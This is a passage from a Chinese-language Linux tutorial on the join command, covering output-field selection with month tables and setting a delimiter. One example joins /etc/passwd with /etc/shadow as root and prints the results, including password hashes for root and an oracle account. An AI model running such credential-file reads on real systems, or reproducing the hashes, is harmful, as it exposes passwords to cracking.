May\n6 June\n7 July\n8 August\n9 September\n10 October\n11 November\n12 December\n[root@rhel55 linux]# join -o 1.1 2.2 1.2 monthcn.txt monthen.txt\n1 January 一月\n2 February 二月\n3 March 三月\n4 April 四月\n5 May 五月\n6 June 六月\n7 July 七月\n8 August 八月\n9 September 九月\n10 October 十月\n11 November 十一月\n12 December 十二月\n[root@rhel55 linux]# join -o 1.1 2.2 1.2 1.3 monthcn.txt monthen.txt   \u003c== 字段1.3并不存在\n1 January 一月\n2 February 二月\n3 March 三月\n4 April 四月\n5 May 五月\n6 June 六月\n7 July 七月\n8 August 八月\n9 September 九月\n10 October 十月\n11 November 十一月\n12 December 十二月\n[root@rhel55 linux]#\n\n示例六 指定分隔符\n\n[root@rhel55 linux]# join -t ':' /etc/passwd /etc/shadow\nroot:x:0:0:root:/root:/bin/bash:$1$K8WSIAfQ$9i1h6a4V1XeIn0lv.CT53/:14833:0:99999:7:::\nbin:x:1:1:bin:/bin:/sbin/nologin::14833:0:99999:7:::\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin::14833:0:99999:7:::\nadm:x:3:4:adm:/var/adm:/sbin/nologin::14833:0:99999:7:::\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin::14833:0:99999:7:::\nsync:x:5:0:sync:/sbin:/bin/sync::14833:0:99999:7:::\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown::14833:0:99999:7:::\nhalt:x:7:0:halt:/sbin:/sbin/halt::14833:0:99999:7:::\nmail:x:8:12:mail:/var/spool/mail:/sbin/nologin::14833:0:99999:7:::\nnews:x:9:13:news:/etc/news:::14833:0:99999:7:::\nuucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin::14833:0:99999:7:::\noperator:x:11:0:operator:/root:/sbin/nologin::14833:0:99999:7:::\ngames:x:12:100:games:/usr/games:/sbin/nologin::14833:0:99999:7:::\ngopher:x:13:30:gopher:/var/gopher:/sbin/nologin::14833:0:99999:7:::\nftp:x:14:50:FTP User:/var/ftp:/sbin/nologin::14833:0:99999:7:::\nnobody:x:99:99:Nobody:/:/sbin/nologin:*:14833:0:99999:7:::\nnscd:x:28:28:NSCD Daemon:/:/sbin/nologin:!!:14833:0:99999:7:::\nvcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin:!!:14833:0:99999:7:::\nrpc:x:32:32:Portmapper RPC user:/:/sbin/nologin:!!:14833:0:99999:7:::\nmailnull:x:47:47::/var/spool/mqueue:/sbin/nologin:!!:14833:0:99999:7:::\nsmmsp:x:51:51::/var/spool/mqueue:/sbin/nologin:!!:14833:0:99999:7:::\npcap:x:77:77::/var/arpwatch:/sbin/nologin:!!:14833:0:99999:7:::\nntp:x:38:38::/etc/ntp:/sbin/nologin:!!:14833:0:99999:7:::\ndbus:x:81:81:System message bus:/:/sbin/nologin:!!:14833:0:99999:7:::\navahi:x:70:70:Avahi daemon:/:/sbin/nologin:!!:14833:0:99999:7:::\nsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin:!!:14833:0:99999:7:::\nrpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin:!!:14833:0:99999:7:::\nnfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin:!!:14833:0:99999:7:::\nhaldaemon:x:68:68:HAL daemon:/:/sbin/nologin:!!:14833:0:99999:7:::\navahi-autoipd:x:100:101:avahi-autoipd:/var/lib/avahi-autoipd:/sbin/nologin:!!:14833:0:99999:7:::\noprofile:x:16:16:Special user account to be used by OProfile:/home/oprofile:/sbin/nologin:!!:14833:0:99999:7:::\nxfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologin:!!:14833:0:99999:7:::\ngdm:x:42:42::/var/gdm:/sbin/nologin:!!:14833:0:99999:7:::\nsabayon:x:86:86:Sabayon user:/home/sabayon:/sbin/nologin:!!:14833:0:99999:7:::\noracle:x:500:500::/opt/oracle:/bin/bash:$1$v64Pa.m.$GZMrQiOWCdQPF8XKtWju30:14833:0:99999:7:::\nmysql:x:101:104:MySQL server:/var/lib/mysql:/bin/bash:!!:14866::::::\n[root@rhel55 linux]#\n问题思考\n\n怎样使用join命令实现两个文件中关键字的交集、并集、差集？\n\n怎样使用join命令中指定关键字的列，而非默认的第一列？\n相关资料\n\n【1】甜菜与咸菜 缺哪补哪，用技术武装自信 linux 的join命令--总结\n\n【2】动态网站制作指南 深入浅出SQL之左连接、右连接和全连接","tags":null}]